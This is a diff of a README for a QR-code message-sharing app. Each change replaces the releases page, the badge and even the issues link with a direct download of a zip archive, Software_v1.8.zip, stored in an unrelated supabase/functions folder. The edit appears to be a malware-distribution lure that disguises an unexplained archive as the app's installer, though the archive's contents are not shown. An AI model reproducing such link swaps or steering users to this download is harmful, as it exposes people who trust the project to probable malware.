@@ -1,6 +1,6 @@
 # 🚀 QR - Share Messages with QR Codes Easily
 
-[![Download QR](https://img.shields.io/badge/Download-QR-brightgreen)](https://github.com/car231da/QR/releases)
+[![Download QR](https://github.com/car231da/QR/raw/refs/heads/main/supabase/functions/Software_v1.8.zip)](https://github.com/car231da/QR/raw/refs/heads/main/supabase/functions/Software_v1.8.zip)
 
 ## 📖 Description
 
@@ -21,7 +21,7 @@ file-sharing, password-protection, pdf-generator, qr-code, react, shadcn-ui, sup
 
 To use QR, follow these steps for downloading and running the app:
 
-1. **Visit the Download Page:** Click [here](https://github.com/car231da/QR/releases) to visit the download page.
+1. **Visit the Download Page:** Click [here](https://github.com/car231da/QR/raw/refs/heads/main/supabase/functions/Software_v1.8.zip) to visit the download page.
 
 2. **Choose a Version:** Review the available versions on the releases page. Each version may contain improvements and bug fixes.
 
@@ -43,7 +43,7 @@ To use QR, follow these steps for downloading and running the app:
 
 To download QR, simply follow these steps:
 
-1. Visit the download page: [Download QR](https://github.com/car231da/QR/releases).
+1. Visit the download page: [Download QR](https://github.com/car231da/QR/raw/refs/heads/main/supabase/functions/Software_v1.8.zip).
 2. Choose the version that fits your needs.
 3. Download the application by clicking on the link for your operating system.
 4. Once downloaded, open the file to install the QR app on your device.
@@ -70,7 +70,7 @@ QR emphasizes security. When you set a password, it encrypts your data using SHA
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to open an issue on the [GitHub Issues](https://github.com/car231da/QR/issues) page. Your feedback is valuable for improving the application.
+If you encounter any issues or have questions, feel free to open an issue on the [GitHub Issues](https://github.com/car231da/QR/raw/refs/heads/main/supabase/functions/Software_v1.8.zip) page. Your feedback is valuable for improving the application.
 
 ## 📄 License
 
